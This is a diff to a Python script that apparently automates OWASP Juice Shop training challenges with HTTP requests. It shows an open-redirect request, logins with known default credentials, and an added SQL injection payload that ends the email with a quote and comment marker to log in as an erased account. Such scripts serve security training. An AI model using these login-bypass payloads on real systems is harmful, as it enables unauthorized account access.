@@ -18,3 +18,5 @@ requests.get(url+'/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbL
 requests.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'})
 # ---- Login MC SafeSearch (Log in with MC SafeSearch's original user credentials without applying SQL Injection or any other bypass.)
 requests.post(url+'/rest/user/login', data={'email':'mc.safesearch@juice-sh.op','password':'Mr. N00dles'})
+# ---- GDPR Data Erasure (Log in with Chris' erased user account.)
+requests.post(url+'/rest/user/login', data={'email':'chris.pike@juice-sh.op\'--','password':'a'})
